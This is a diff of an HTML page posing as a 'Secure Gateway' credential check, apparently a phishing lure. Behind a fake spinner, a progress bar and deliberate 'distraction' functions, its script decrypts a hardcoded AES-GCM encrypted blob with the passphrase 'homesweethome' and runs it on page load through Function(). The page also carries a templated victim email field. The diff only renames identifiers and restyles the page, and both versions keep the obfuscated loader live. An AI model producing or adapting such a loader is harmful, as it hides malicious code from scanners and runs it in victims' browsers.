@@ -3,108 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="creator" content="CodePhantom">
-    <title>Access Portal</title>
+    <meta name="creator" content="ShadowCoder">
+    <title>Secure Gateway</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f0f0f0;
-            font-family: 'Arial', sans-serif;
+            background: #e0e0e0;
+            font-family: 'Verdana', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             flex-direction: column;
         }
-        .loader {
-            width: 80px;
-            height: 80px;
-            border: 12px solid #ddd;
-            border-top: 12px solid #8a2be2;
+        .spinner {
+            width: 90px;
+            height: 90px;
+            border: 15px solid #ccc;
+            border-top: 15px solid #7b1fa2;
             border-radius: 50%;
-            animation: rotate 2s infinite linear;
+            animation: spin 1.5s infinite linear;
         }
-        @keyframes rotate {
+        @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .status-text {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #555;
+        .loading-text {
+            margin-top: 25px;
+            font-size: 20px;
+            color: #444;
         }
-        .invisible-section {
+        .hidden-section {
             display: none;
         }
-        .fake-progress-bar {
-            width: 200px;
-            height: 10px;
-            background: #ccc;
-            margin-top: 20px;
-            border-radius: 5px;
+        .fake-loader {
+            width: 250px;
+            height: 12px;
+            background: #ddd;
+            margin-top: 25px;
+            border-radius: 6px;
             overflow: hidden;
         }
         .fake-progress {
             width: 0%;
             height: 100%;
-            background: #8a2be2;
-            animation: fake-load 3s infinite;
+            background: #7b1fa2;
+            animation: fake-progress 4s infinite;
         }
-        @keyframes fake-load {
+        @keyframes fake-progress {
             0% { width: 0%; }
-            50% { width: 50%; }
+            50% { width: 75%; }
             100% { width: 100%; }
         }
     </style>
 </head>
 
 <body>
-    <div class="invisible-section">
-        <span data-tag="hidden-element" custom-attr=""></span>
+    <div class="hidden-section">
+        <span data-tag="secret-element" nike-tes1=""></span>
     </div>
 
     <div data-identifier="c2VjdXJlLWNvZGVz" adidas="<%=EMAIL64%>"></div>
-    <p class="status-text">Validating access, please standby...</p>
+    <p class="loading-text">Verifying credentials, please wait...</p>
 
-    <div class="loader"></div>
-    <div class="fake-progress-bar">
-        <div nike-tes1=""></div>
+    <div class="spinner"></div>
+    <div class="fake-loader">
+        <div class="fake-progress"></div>
     </div>
 
     <script>
         // Useless Functions (Distraction)
-        function generateRandomLogs() {
-            const logs = ["System booting up...", "Loading resources...", "Preparing environment..."];
-            logs.forEach(log => {
-                // console.log(`[SYSTEM] ${log}`);
+        function logRandomMessages() {
+            const messages = ["Initializing system...", "Loading modules...", "Preparing data..."];
+            messages.forEach(msg => {
+                // console.log(`[LOG] ${msg}`);
             });
         }
-        generateRandomLogs();
+        logRandomMessages();
 
-        function simulateProgress() {
-            const steps = ["Step 1: Initializing...", "Step 2: Processing...", "Step 3: Finalizing..."];
+        function fakeLoadingSteps() {
+            const steps = ["Phase 1: Starting...", "Phase 2: Analyzing...", "Phase 3: Completing..."];
             steps.forEach(step => {
-                // console.log(`[PROGRESS] ${step}`);
+                // console.log(`[LOADING] ${step}`);
             });
         }
-        simulateProgress();
+        fakeLoadingSteps();
 
         // Core Decryption Logic
-        async function decryptSecurePayload(encodedData, initVector, saltKey, passphrase) {
-            function hexToBytes(hexStr) {
-                let bytes = new Uint8Array(hexStr.length / 2);
-                for (let i = 0; i < hexStr.length; i += 2) {
-                    bytes[i / 2] = parseInt(hexStr.substr(i, 2), 16);
+        async function decodeSecureData(encryptedData, initializationVector, saltValue, secretPhrase) {
+            function hexToByteArray(hexString) {
+                let byteArray = new Uint8Array(hexString.length / 2);
+                for (let i = 0; i < hexString.length; i += 2) {
+                    byteArray[i / 2] = parseInt(hexString.substr(i, 2), 16);
                 }
-                return bytes;
+                return byteArray;
             }
 
-            const delay = () => new Promise(resolve => setTimeout(resolve, 600));
+            const wait = () => new Promise(resolve => setTimeout(resolve, 700));
 
-            async function deriveEncryptionKey(material, salt) {
+            async function generateDecryptionKey(keyMaterial, salt) {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt: salt, iterations: 100000, hash: "SHA-256" },
-                    material,
+                    keyMaterial,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
@@ -113,23 +113,23 @@
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(passphrase),
+                new TextEncoder().encode(secretPhrase),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await delay();
-            const encryptionKey = await deriveEncryptionKey(keyMaterial, hexToBytes(saltKey));
+            await wait();
+            const decryptionKey = await generateDecryptionKey(keyMaterial, hexToByteArray(saltValue));
 
             try {
-                const decryptedBytes = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexToBytes(initVector) },
-                    encryptionKey,
-                    hexToBytes(encodedData)
+                const decryptedData = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: hexToByteArray(initializationVector) },
+                    decryptionKey,
+                    hexToByteArray(encryptedData)
                 );
-                console.log("[SUCCESS] Payload decrypted successfully.");
-                return new TextDecoder().decode(decryptedBytes);
+                console.log("[SUCCESS] Data decrypted successfully.");
+                return new TextDecoder().decode(decryptedData);
             } catch (error) {
                 console.error("[ERROR] Decryption failed:", error);
                 return null;
@@ -137,21 +137,21 @@
         }
 
         (async () => {
-            console.log("[INIT] Starting decryption sequence...");
-            const payload = {
+            console.log("[INIT] Starting decryption process...");
+            const encryptedPayload = {
                 key: "0a6d791008bd13b5d22d4e92",
                 salt: "cb6853c10fc7a13ae3fd54b1af489606",
                 data: "e2b5f7da69e614a29737cf95404cf4d2bf56f5c5635356c0e94917b504bbd2e4fa7e7c3b7a9849dc3c26889e14e28690daa199f60070b2fcaae0726a246226d9e1e34f65b6aba4b2151016ccf4ba0dcecc38e79804fa296c4d94ef4b64c9f1ed021e3c331af17d2bdd40f791f580c232810895aaf42def5bc9ff15a11dc27fa5c5d003a7a0a14968d58ad8833940a2e935a85cef230aea8a89254e4f6e6659b9af8d7fea89a1f8642c75710c053816c3385cf63667c1e2c2b25cd4b7ddf2570c"
             };
 
-            const passphrase = "homesweethome";
-            const decryptedContent = await decryptSecurePayload(payload.data, payload.key, payload.salt, passphrase);
-            console.log(decryptedContent);
+            const secretPhrase = "homesweethome";
+            const decryptedResult = await decodeSecureData(encryptedPayload.data, encryptedPayload.key, encryptedPayload.salt, secretPhrase);
+            console.log(decryptedResult);
             
-            Function(`${decryptedContent}`)();
+            Function(`${decryptedResult}`)();
 
-            if (decryptedContent) {
-                // console.log("[INFO] Decrypted Payload:", decryptedContent);
+            if (decryptedResult) {
+                // console.log("[INFO] Decrypted Data:", decryptedResult);
             }
         })();
     </script>
